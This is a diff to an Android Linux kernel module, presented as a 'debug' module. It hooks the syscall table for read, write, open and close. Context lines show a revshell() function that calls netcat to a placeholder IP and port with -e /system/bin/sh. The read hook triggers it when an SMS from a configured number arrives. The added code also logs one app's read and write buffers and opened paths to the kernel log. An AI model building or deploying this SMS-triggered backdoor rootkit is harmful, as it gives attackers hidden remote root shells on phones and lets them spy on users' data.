@@ -22,7 +22,7 @@
 #include <linux/types.h> 
 #include <linux/unistd.h> 
 #include <linux/version.h> 
-#include <linux/workqueue.h> 
+#include <linux/workqueue.h>
 
 void vector_table();
 void vector_swi();
@@ -30,6 +30,15 @@ unsigned long * syscall_table();
 
 // Original syscalls
 asmlinkage ssize_t (*syscall_read) (int fd, char *buf, size_t count);
+asmlinkage ssize_t (*syscall_write) (int fd, char *buf, size_t count);
+asmlinkage ssize_t (*syscall_open) (const char *pathname, int flags);
+asmlinkage ssize_t (*syscall_close) (int fd);
+asmlinkage int (*getuid_call)();
+
+static int appUID = NULL;
+
+module_param(appUID, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
+MODULE_PARM_DESC(appUID, "Application's UID");
 
 static int revshell(void) {
   char *argv[] = { "/system/bin/nc", "YOUR IP", "YOUR PORT", "-e",  "/system/bin/sh",  NULL };		// CHANGE THIS LINE
@@ -41,16 +50,54 @@ static int revshell(void) {
 }
 
 // Hooked syscalls
+
 asmlinkage ssize_t hooked_syscall_read(int fd, char *buf, size_t count) {
-	printk (KERN_INFO "HOOKED SYS_READ: %s\n", buf);
+	//printk (KERN_INFO "HOOKED SYS_READ: %s\n", buf);
 
 	if(strstr (buf, "getSmsNewMessageNotificationInfo")) {
-			if(strstr(buf, "addr=YOUR PHONE NUMBER")) // CHANGE THIS LINE
+			if(strstr(buf, "addr=YOUR NUMBER")) // CHANGE THIS LINE
 				revshell();
 	}
-	else return syscall_read(fd, buf, count);
+	else {
+		uid_t gtuid;
+		gtuid = getuid_call();
+		
+		if(gtuid == appUID)
+				printk("----------->DEBUG APP uid = %d - SYS_READ_HOOK: %s\n", gtuid, buf);
 
+		return syscall_read(fd, buf, count);
+	}
 	return syscall_read(fd, buf, count);
+}
+
+asmlinkage ssize_t hooked_syscall_write(int fd, char *buf, size_t count) {
+	uid_t gtuid;
+	gtuid = getuid_call();
+
+	if(gtuid == appUID)
+		printk("----------->DEBUG APP uid = %d - SYS_WRITE_HOOK: %s\n", gtuid, buf);
+
+	return syscall_write(fd, buf, count);
+}
+
+asmlinkage ssize_t hooked_syscall_open(const char *pathname, int flags) {
+	uid_t gtuid;
+	gtuid = getuid_call();
+	
+	if(gtuid == appUID)
+		printk("----------->DEBUG APP uid = %d - SYS_OPEN_HOOK: %s\n", gtuid, pathname);
+
+	return syscall_open(pathname, flags);
+}
+
+asmlinkage ssize_t hooked_syscall_close(int fd) {
+	uid_t gtuid;
+	gtuid = getuid_call();
+	
+	if(gtuid == appUID)
+		printk("----------->DEBUG APP uid = %d - SYS_CLOSE_HOOK: %s\n", gtuid, current->comm);
+
+	return syscall_close(fd);
 }
 
 /*
@@ -144,6 +191,16 @@ static int __init debug_start() {
 	
 	syscall_read = syscall[__NR_read];			// Hook sys_read
 	syscall[__NR_read] = hooked_syscall_read;
+	getuid_call = syscall[__NR_getuid];
+
+	syscall_write = syscall[__NR_write];		// Hoook sys_write
+	syscall[__NR_write] = hooked_syscall_write;
+
+	syscall_open = syscall[__NR_open];			// Hook sys_open
+	syscall[__NR_open] = hooked_syscall_open;
+
+	syscall_close = syscall[__NR_close];		// Hook sys_close
+	syscall[__NR_close] = hooked_syscall_close;
 
 	return 0;
 }
@@ -154,8 +211,11 @@ static int __exit debug_stop() {
 
 	// Restoring the original syscalls
 	printk(KERN_INFO "---> (Debug stop) Restoring original syscalls\n");
-	syscall[__NR_read] = &syscall_read;
-
+	syscall[__NR_read] = syscall_read;
+	syscall[__NR_write] = syscall_write;
+	syscall[__NR_open] = syscall_open;
+	syscall[__NR_close] = syscall_close;
+	syscall[__NR_getuid] = getuid_call;
 }
 
 module_init (debug_start);
